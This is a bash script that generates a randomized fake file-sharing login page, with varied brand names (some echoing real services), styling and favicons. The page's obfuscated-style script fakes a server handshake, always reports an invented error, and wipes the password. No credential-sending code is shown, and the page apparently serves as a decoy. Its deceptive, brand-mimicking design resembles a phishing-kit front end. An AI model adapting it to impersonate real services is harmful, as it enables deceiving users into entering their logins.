#!/bin/bash

TARGET_DIR=$1

if [ -z "$TARGET_DIR" ]; then
    echo "Err: Target directory required."
    exit 1
fi

TITLES=("FileShare" "CloudBox" "DataVault" "SecureShare" "EasyFiles" "QuickAccess" "VaultZone" "SkyDrive" "SafeData" "FlexShare" "DropZone" "SecureStorage" "FastFiles" "SharePoint" "MegaVault" "Boxify" "DataBank" "DriveSecure" "FileStream" "AccessHub")
HEADERS=("Welcome to FileShare" "Login to Your CloudBox" "Enter Your Secure Vault" "Access Your DataVault" "Sign in to EasyFiles" "Connect to QuickAccess" "Welcome to VaultZone" "Login to SkyDrive" "Enter Your SafeData" "Sign in to FlexShare" "Access Your DropZone" "Welcome to SecureStorage" "Login to FastFiles" "Enter Your SharePoint" "Welcome to MegaVault" "Sign in to Boxify" "Access Your DataBank" "Welcome to DriveSecure" "Login to FileStream" "Connect to AccessHub")
BUTTON_TEXTS=("Sign In" "Log In" "Login" "Access Account" "Enter Account" "Sign In to Continue" "Sign In to Dashboard" "Log In to Your Account" "Continue to Account" "Access Your Dashboard" "Let’s Go" "Welcome Back!" "Get Started" "Join Us Again" "Back Again? Sign In" "Secure Sign In" "Protected Login" "Sign In Securely" "Enter" "Go")

ERROR_MESSAGES=(
    "Invalid credentials provided."
    "Session token expired."
    "Connection timed out (Error 0x41)."
    "Access denied: 403 Forbidden."
    "Authentication server unavailable."
)

FAVICONS=(
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMjU2M0VCIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTE3LjUgMTlhMy41IDMuNSAwIDAgMCAwLTdoLTVhNC41IDQuNSAwIDAgMC04LjggMi4xQSA0IDQgMCAwIDAgNiAyMWgxMS41eiIvPjwvc3ZnPg=="
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjNDc1NTY5IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+PHBhdGggZD0iTTcgMTEVdi00YTUgNSAwIDAgMSAxMCAwdjQiLz48L3N2Zz4="
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjREM1RjAwIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIybDguMTMtOC44NWMuNDgtLjUyLjU2LTEuMzMuMi0xLjkxbC01LjI0LTguNDZhMiAyIDAgMCAwLTEuNzItLjkzSDguNjNhMiAyIDAgMCAwLTEuNzIuOTNMMS42NyAxMS4yNWMtLjM2LjU4LS4yOCAxLjM5LjIgMS45MUwxMiAyMnoiLz48L3N2Zz4="
)

FONTS_DATA=(
    "Inter|Inter:wght@400;600;700"
    "Poppins|Poppins:wght@400;600;700"
    "Roboto|Roboto:wght@400;500;700"
    "Lato|Lato:wght@400;700"
)

ROUNDNESS_OPTS=("rounded-lg" "rounded-xl" "rounded-2xl")
BUTTON_COLORS=("bg-blue-600 hover:bg-blue-700" "bg-indigo-600 hover:bg-indigo-700" "bg-slate-800 hover:bg-slate-900" "bg-emerald-600 hover:bg-emerald-700")

BG_GRADIENTS=(
    "bg-gradient-to-br from-blue-50 via-white to-blue-50"
    "bg-gradient-to-tr from-gray-100 to-gray-200"
    "bg-gradient-to-br from-slate-900 via-gray-900 to-black"
    "bg-gradient-to-r from-blue-900 to-slate-900"
)

TITLE=${TITLES[$RANDOM % ${#TITLES[@]}]}
HEADER=${HEADERS[$RANDOM % ${#HEADERS[@]}]}
BUTTON_TEXT=${BUTTON_TEXTS[$RANDOM % ${#BUTTON_TEXTS[@]}]}
ERROR_TEXT=${ERROR_MESSAGES[$RANDOM % ${#ERROR_MESSAGES[@]}]}
BUTTON_COLOR=${BUTTON_COLORS[$RANDOM % ${#BUTTON_COLORS[@]}]}
BG_STYLE=${BG_GRADIENTS[$RANDOM % ${#BG_GRADIENTS[@]}]}
ROUNDING=${ROUNDNESS_OPTS[$RANDOM % ${#ROUNDNESS_OPTS[@]}]}
FAVICON=${FAVICONS[$RANDOM % ${#FAVICONS[@]}]}

FONT_PAIR=${FONTS_DATA[$RANDOM % ${#FONTS_DATA[@]}]}
FONT_NAME=$(echo $FONT_PAIR | cut -d'|' -f1)
FONT_URL_PART=$(echo $FONT_PAIR | cut -d'|' -f2)

RANDOM_TOKEN=$(openssl rand -hex 16)

if [[ "$BG_STYLE" == *"slate-900"* || "$BG_STYLE" == *"black"* ]]; then
    THEME_MODE=1
else
    THEME_MODE=0
fi

if [ $THEME_MODE -eq 1 ]; then
    TEXT_MAIN="text-white"
    TEXT_MUTED="text-gray-400"
    TEXT_INPUT="text-white"
    CARD_BG="bg-gray-900/50 backdrop-blur-xl border border-gray-700/50 shadow-2xl"
    INPUT_BG="bg-gray-800/50 border-gray-600 focus:border-blue-500 placeholder-gray-500"
    ERROR_BOX="bg-red-900/20 border-red-800 text-red-300"
else
    TEXT_MAIN="text-gray-900"
    TEXT_MUTED="text-gray-500"
    TEXT_INPUT="text-gray-900"
    CARD_BG="bg-white/90 backdrop-blur-xl border border-gray-100 shadow-xl"
    INPUT_BG="bg-white border-gray-300 focus:border-blue-600 focus:ring-4 focus:ring-blue-600/10 placeholder-gray-400"
    ERROR_BOX="bg-red-50 border-red-100 text-red-600"
fi

cat > "$TARGET_DIR/index.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <title>$TITLE</title>
    <link rel="icon" type="image/svg+xml" href="$FAVICON">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=${FONT_URL_PART}&display=swap" rel="stylesheet">
    <style>
        body { font-family: '$FONT_NAME', sans-serif; -webkit-font-smoothing: antialiased; }
        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
        .loader { border: 2px solid transparent; border-radius: 50%; border-top: 2px solid currentColor; width: 1.25rem; height: 1.25rem; -webkit-animation: spin 1s linear infinite; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .fade-enter { opacity: 0; transform: translateY(-5px); }
        .fade-enter-active { opacity: 1; transform: translateY(0); transition: opacity 300ms, transform 300ms; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen $BG_STYLE">
    
    <div id="auth-container" class="w-full max-w-[400px] mx-4 p-8 sm:p-10 space-y-6 $CARD_BG $ROUNDING transition-all">
        <div class="text-center space-y-2 mb-8">
            <div class="h-12 w-12 mx-auto mb-4 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg text-white">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            </div>
            <h2 class="text-2xl font-bold tracking-tight $TEXT_MAIN">$HEADER</h2>
            <p class="text-sm $TEXT_MUTED">Secure Environment Access</p>
        </div>

        <div id="sys-msg" class="hidden p-3 text-sm rounded-md border flex items-start gap-3 $ERROR_BOX" role="alert">
            <svg class="w-5 h-5 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
            <span class="font-medium" id="msg-content"></span>
        </div>

        <form id="vform" class="space-y-5" autocomplete="off">
            <input type="hidden" name="csrf_token" value="$RANDOM_TOKEN" />
            <input type="hidden" name="fingerprint" id="fp" value="" />
            
            <div class="space-y-1.5">
                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED"> Email</label>
                <input type="email" id="uid" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="user@domain.com" />
            </div>
            
            <div class="space-y-1.5">
                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Password</label>
                <input type="password" id="sec" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="" />
            </div>
            
            <button type="submit" id="act-btn" class="w-full py-2.5 text-sm font-semibold text-white shadow-md transition-all active:scale-[0.98] $BUTTON_COLOR $ROUNDING flex justify-center items-center gap-2">
                <span id="btn-txt">$BUTTON_TEXT</span>
            </button>
        </form>
        

    </div>

    <script>
    (function() {
        const _0x4e = ['$ERROR_TEXT', 'Verifying...', 'Authenticating...', 'Handshake failed', 'Unexpected 502', 'Connection established'];
        
        const \$ = (s) => document.querySelector(s);
        const wait = (ms) => new Promise(r => setTimeout(r, ms));
        
        \$('#fp').value = btoa(navigator.userAgent + Date.now());

        const AuthController = {
            init: function() {
                \$('#vform').addEventListener('submit', this.handleSubmit.bind(this));
                console.log('%c [System] Secure Gateway Initialized', 'color: #22c55e; font-weight:bold');
            },
            
            handleSubmit: async function(e) {
                e.preventDefault();
                const btn = \$('#act-btn');
                const txt = \$('#btn-txt');
                const msg = \$('#sys-msg');
                const original = txt.innerText;
                
                msg.classList.add('hidden');
                btn.disabled = true;
                btn.classList.add('opacity-80', 'cursor-wait');
                
                txt.innerHTML = '<div class="loader"></div>';
                console.log('[Net] Sending handshake packet...');
                
                await wait(600 + Math.random() * 400);
                txt.innerHTML = '<div class="loader"></div> <span class="ml-2">' + _0x4e[1] + '</span>';
                
                await wait(800 + Math.random() * 600);
                console.log('[Auth] Token exchange in progress...');
                
                btn.disabled = false;
                btn.classList.remove('opacity-80', 'cursor-wait');
                txt.innerText = original;
                
                const errContainer = \$('#auth-container');
                msg.querySelector('#msg-content').innerText = _0x4e[0];
                msg.classList.remove('hidden');
                msg.classList.add('fade-enter-active');
                
                errContainer.classList.add('shake');
                console.error('[Err] ' + _0x4e[3]);
                
                \$('#sec').value = '';
                \$('#sec').focus();
                
                setTimeout(() => errContainer.classList.remove('shake'), 500);
            }
        };

        document.addEventListener('DOMContentLoaded', () => AuthController.init());
    })();
    </script>
</body>
</html>
EOF

echo "Generated in $TARGET_DIR"